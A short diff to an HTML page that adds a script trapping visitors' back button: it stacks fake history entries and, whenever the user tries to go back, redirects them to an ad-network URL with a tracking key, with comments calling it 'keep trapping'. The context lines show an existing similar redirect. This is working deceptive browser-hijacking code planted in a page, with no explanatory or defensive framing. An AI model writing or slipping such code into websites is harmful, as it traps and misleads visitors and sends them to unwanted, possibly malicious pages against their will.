@@ -127,6 +127,25 @@ window.onpopstate = function () {
   window.location.href = smartLink;
 };
   </script>
+
+  <script>
+let count = 0;
+const maxRedirects = 3;
+const url = "https://www.profitablecpmratenetwork.com/uvzsmhf6s1?key=3620a4de4c47107c53adf379f9659784";
+
+// create stronger history stack
+for (let i = 0; i < maxRedirects; i++) {
+    history.pushState({page:i}, "", location.href);
+}
+
+window.addEventListener("popstate", function () {
+    if (count < maxRedirects) {
+        count++;
+        history.pushState(null, "", location.href); // keep trapping
+        window.location.replace(url); // instant redirect
+    }
+});
+  </script>
   
 </body>
 </html>
